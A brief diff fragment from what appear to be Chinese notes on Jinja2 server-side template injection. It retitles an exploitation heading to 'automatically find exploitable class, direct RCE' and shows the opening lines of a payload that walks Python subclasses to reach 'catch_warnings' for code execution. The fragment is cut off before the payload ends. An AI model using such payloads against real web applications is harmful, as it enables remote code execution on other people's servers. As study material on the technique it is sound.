@@ -95,7 +95,7 @@ your input object基类的子类
 
 ^
 ## **利用**
-直接RCE
+自动化寻找利用类直接RCE
 ```
 {% for c in [].__class__.__base__.__subclasses__() %} 
   {% if c.__name__ == 'catch_warnings' %} 
